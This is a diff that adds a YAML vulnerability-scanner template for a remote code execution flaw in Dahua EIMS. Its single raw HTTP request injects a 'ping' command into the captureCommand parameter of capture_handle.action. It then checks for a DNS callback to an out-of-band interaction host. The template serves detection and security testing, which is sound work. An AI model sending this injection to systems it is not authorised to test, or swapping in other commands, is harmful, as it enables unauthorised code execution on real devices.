@@ -1,0 +1,26 @@
+id: poc-yaml-dahua-eims-capture-handle-rce
+info:
+  name: Dahua EIMS capture_handle Remote Code Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce,dns,oast
+
+variables:
+  reverse: "{{interactsh-url}}"
+
+http:
+  - raw:
+      - |
+        GET /config/asst/system_setPassWordValidate.action/capture_handle.action?captureFlag=true&captureCommand=ping%20{{reverse}}%20index.pcap HTTP/1.1
+        Host: {{Hostname}}
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "success"
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
